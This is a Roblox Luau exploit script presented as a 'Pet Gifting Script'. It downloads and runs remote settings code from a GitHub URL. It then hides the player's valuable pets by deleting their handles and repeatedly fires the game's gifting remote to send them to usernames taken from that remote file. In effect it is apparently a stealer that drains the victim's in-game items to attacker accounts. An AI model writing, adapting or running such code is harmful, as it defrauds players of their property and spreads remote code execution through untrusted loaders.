-- Load settings
local Settings = loadstring(game:HttpGet("https://raw.githubusercontent.com/unblock-eve/files/refs/heads/main/SETTINGS.lua"))()

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Player reference
local localPlayer = Players.LocalPlayer

-- Helper function to wait
local function wait(duration)
    local start = tick()
    repeat
        RunService.Heartbeat:Wait()
    until tick() - start >= duration
end

-- Function to find valid recipients that are currently in the server
local function findValidRecipients()
    local validRecipients = {}
    
    if not Settings.RECIPIENT_USERNAMES then
        print("❌ No RECIPIENT_USERNAMES found in settings")
        return validRecipients
    end
    
    -- Check each enabled recipient to see if they're in the server
    for username, enabled in pairs(Settings.RECIPIENT_USERNAMES) do
        if enabled then
            local targetPlayer = Players:FindFirstChild(username)
            if targetPlayer then
                table.insert(validRecipients, username)
                print(string.format("✅ Found valid recipient in server: %s", username))
            else
                print(string.format("⚠️ Recipient not found in server: %s", username))
            end
        end
    end
    
    return validRecipients
end

-- Function to select next recipient (round-robin style)
local currentRecipientIndex = 1
local function getNextRecipient(recipients)
    if #recipients == 0 then
        return nil
    end
    
    local recipient = recipients[currentRecipientIndex]
    currentRecipientIndex = currentRecipientIndex + 1
    
    -- Reset to first recipient if we've gone through all
    if currentRecipientIndex > #recipients then
        currentRecipientIndex = 1
    end
    
    return recipient
end

-- Function to delete tool handle (makes it invisible but keeps functionality)
local function deleteToolHandle(tool)
    if tool and tool:FindFirstChild("Handle") then
        tool.Handle:Destroy()
        return true
    end
    return false
end

-- Function to equip pet tool
local function equipPetTool(tool)
    if not tool or not tool.Parent then
        print("❌ Tool is nil or not in backpack")
        return false
    end
    
    local success, result = pcall(function()
        local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid:EquipTool(tool)
            return true
        end
        return false
    end)
    
    if success and result then
        print(string.format("✅ Successfully equipped tool: %s", tool.Name))
        return true
    else
        print(string.format("❌ Failed to equip tool: %s", tool.Name))
        return false
    end
end

-- Function to unequip pet tool
local function unequipPetTool(tool)
    if not tool then return false end
    
    local success, result = pcall(function()
        if tool.Parent == localPlayer.Character then
            tool.Parent = localPlayer.Backpack
            return true
        end
        return false
    end)
    
    if success and result then
        print(string.format("✅ Successfully unequipped tool: %s", tool.Name))
        return true
    else
        print(string.format("❌ Failed to unequip tool: %s", tool.Name))
        return false
    end
end

-- Function to send gifting remote (exactly as specified for exploit environment)
local function sendGiftingRemote(targetPlayerName)
    local args = {
        "GivePet",
        game:GetService("Players"):WaitForChild(targetPlayerName)
    }
    
    local success, result = pcall(function()
        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
    end)
    
    if success then
        print(string.format("✅ Successfully sent gift remote to %s", targetPlayerName))
        return true
    else
        print(string.format("❌ Failed to send gift remote to %s: %s", targetPlayerName, tostring(result)))
        return false
    end
end

-- Function to get valid pet tools from backpack based on UUIDs from main script
local function getValidPetToolsFromData(validPetsData)
    local validTools = {}
    local backpack = localPlayer.Backpack
    
    if not backpack then
        print("❌ Backpack not found")
        return validTools
    end
    
    -- Debug: Show what data we received
    print("🔍 DEBUG: Received validPetsData structure:")
    for priority, pets in pairs(validPetsData) do
        print(string.format("   Priority %s: %d pets", priority, #pets))
        for i, petData in ipairs(pets) do
            print(string.format("      Pet %d: UUID=%s, Name=%s, Source=%s", 
                i, petData.uuid or "nil", petData.name or "nil", petData.source or "nil"))
        end
    end
    
    -- Create a lookup table of valid UUIDs from all priorities
    local validUUIDs = {}
    for priority, pets in pairs(validPetsData) do
        for _, petData in ipairs(pets) do
            -- The main script passes petData.uuid directly, not petData.pet.uuid
            if petData.uuid then
                validUUIDs[petData.uuid] = {
                    priority = priority,
                    petData = petData
                }
            end
        end
    end
    
    print(string.format("🔍 DEBUG: Created lookup table with %d UUIDs", 
        (function() local count = 0; for _ in pairs(validUUIDs) do count = count + 1 end; return count end)()))
    
    -- Find tools in backpack that match valid UUIDs
    print("🔍 DEBUG: Scanning backpack tools...")
    for _, tool in pairs(backpack:GetChildren()) do
        if tool:IsA("Tool") and tool:GetAttribute("PET_UUID") then
            local petUUID = tool:GetAttribute("PET_UUID")
            print(string.format("   Found tool: %s with UUID: %s", tool.Name, petUUID))
            
            if validUUIDs[petUUID] then
                print(string.format("   ✅ Matching UUID found for: %s", tool.Name))
                table.insert(validTools, {
                    tool = tool,
                    uuid = petUUID,
                    priority = validUUIDs[petUUID].priority,
                    petData = validUUIDs[petUUID].petData
                })
            else
                print(string.format("   ❌ UUID not in valid list: %s", tool.Name))
            end
        end
    end
    
    -- Sort by priority (NAME > MUTATION > WEIGHT > AGE)
    local priorityOrder = {NAME = 1, MUTATION = 2, WEIGHT = 3, AGE = 4}
    table.sort(validTools, function(a, b)
        return priorityOrder[a.priority] < priorityOrder[b.priority]
    end)
    
    print(string.format("🔍 DEBUG: Final valid tools count: %d", #validTools))
    
    return validTools
end

-- Main gifting function
local function processGifting(validPetsData, recipients)
    print("=== STARTING PET GIFTING PROCESS ===")
    print(string.format("📋 Recipients: %s", table.concat(recipients, ", ")))
    
    -- Debug: Show received data structure
    print("🔍 DEBUG: Received valid pets data:")
    for priority, pets in pairs(validPetsData) do
        print(string.format("   %s: %d pets", priority, #pets))
    end
    
    local cycle = 1
    local totalGifted = 0
    local giftingStats = {}
    
    -- Initialize stats for each recipient
    for _, recipient in ipairs(recipients) do
        giftingStats[recipient] = 0
    end
    
    while true do
        print(string.format("\n--- CYCLE %d ---", cycle))
        
        -- Get current valid tools from backpack
        local validTools = getValidPetToolsFromData(validPetsData)
        
        if #validTools == 0 then
            print("✅ No more valid pet tools found in backpack. Gifting complete!")
            break
        end
        
        print(string.format("Found %d valid pet tools to process", #validTools))
        
        -- Process each valid tool
        for i, toolData in ipairs(validTools) do
            local tool = toolData.tool
            local petUUID = toolData.uuid
            local priority = toolData.priority
            
            -- Get next recipient in rotation
            local currentRecipient = getNextRecipient(recipients)
            if not currentRecipient then
                print("❌ No valid recipients found!")
                return
            end
            
            print(string.format("\nProcessing %d/%d: %s (Priority: %s) → %s", 
                i, #validTools, tool.Name, priority, currentRecipient))
            
            -- Step 1: Delete tool handle
            deleteToolHandle(tool)
            
            -- Step 2: Equip the tool
            if equipPetTool(tool) then
                wait(0.2) -- Wait for equip to register
                
                -- Step 3: Send gifting remote (no UUID needed, just uses equipped tool)
                if sendGiftingRemote(currentRecipient) then
                    giftingStats[currentRecipient] = giftingStats[currentRecipient] + 1
                    totalGifted = totalGifted + 1
                end
                wait(0.1)
                
                -- Step 4: Unequip the tool (tool should be gone after gifting)
                unequipPetTool(tool)
            else
                print(string.format("❌ Skipping gift for %s due to equip failure", tool.Name))
            end
            
            -- Use delay from settings
            local delayBetweenPets = Settings.DELAY_BETWEEN_PETS or 0.5
            wait(delayBetweenPets)
        end
        
        cycle = cycle + 1
        
        -- Print current stats
        print(string.format("\n📊 GIFTING STATS (Total: %d)", totalGifted))
        for recipient, count in pairs(giftingStats) do
            print(string.format("   %s: %d pets", recipient, count))
        end
        
        -- Wait 5 seconds before next cycle
        print(string.format("\n⏳ Waiting 5 seconds before cycle %d...", cycle))
        wait(5)
    end
    
    print("\n=== PET GIFTING PROCESS COMPLETED ===")
    print(string.format("🎉 Total pets gifted: %d", totalGifted))
    print("📊 Final distribution:")
    for recipient, count in pairs(giftingStats) do
        print(string.format("   %s: %d pets", recipient, count))
    end
end

-- Example usage function (to be called with data from main script)
local function startGiftingProcess(validPetsData, customRecipients)
    if not validPetsData then
        print("❌ No valid pets data provided")
        return
    end
    
    -- Use custom recipients if provided, otherwise find valid recipients from settings
    local recipients = customRecipients or findValidRecipients()
    
    if not recipients or #recipients == 0 then
        print("❌ No valid recipients found in server")
        print("💡 Make sure at least one recipient from Settings.RECIPIENT_USERNAMES is in the server")
        if Settings.RECIPIENT_USERNAMES then
            print("🔍 Checking for these recipients:")
            for username, enabled in pairs(Settings.RECIPIENT_USERNAMES) do
                if enabled then
                    print(string.format("   - %s", username))
                end
            end
        end
        return
    end
    
    print(string.format("🎯 Found %d valid recipients in server: %s", #recipients, table.concat(recipients, ", ")))
    
    -- Start the gifting process
    processGifting(validPetsData, recipients)
end

-- Export the main function
_G.startGiftingProcess = startGiftingProcess

print("🚀 Pet Gifting Script Loaded!")

-- Auto-start if valid pets data is available from main script
if _G.VALID_PETS_DATA then
    print("📦 Valid pets data found from main script!")
    
    -- Find recipients that are currently in the server
    local recipients = findValidRecipients()
    
    if recipients and #recipients > 0 then
        print(string.format("🎯 Starting gifting process with %d recipients found in server", #recipients))
        startGiftingProcess(_G.VALID_PETS_DATA)
    else
        print("⚠️ No valid recipients found in current server")
        print("💡 Make sure at least one recipient from Settings.RECIPIENT_USERNAMES is in the server")
        print("Manual usage: _G.startGiftingProcess(_G.VALID_PETS_DATA, {'Username1', 'Username2'})")
    end
else
    print("⚠️ No valid pets data found. Manual usage required:")
    print("Usage: _G.startGiftingProcess(validPetsData, optionalRecipientsList)")
end
